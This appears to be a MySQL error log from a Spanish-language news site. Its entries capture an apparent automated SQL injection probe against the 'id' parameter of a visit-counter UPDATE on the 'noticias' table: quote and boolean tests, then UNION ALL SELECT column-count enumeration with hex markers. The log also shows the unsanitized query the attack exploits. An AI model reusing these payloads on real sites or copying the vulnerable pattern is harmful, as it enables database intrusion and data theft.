+Time : 05:35:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select--
+
+Time : 05:35:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536--
+
+Time : 05:35:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536--
+
+Time : 05:35:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275'
+
+Time : 05:34:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275" and "x"="y
+
+Time : 05:34:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275" and "x"="x
+
+Time : 05:34:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275' and 'x'='y
+
+Time : 05:34:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275' and 'x'='x
+
+Time : 05:32:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275'
+
+Time : 03:45:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 00:46:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
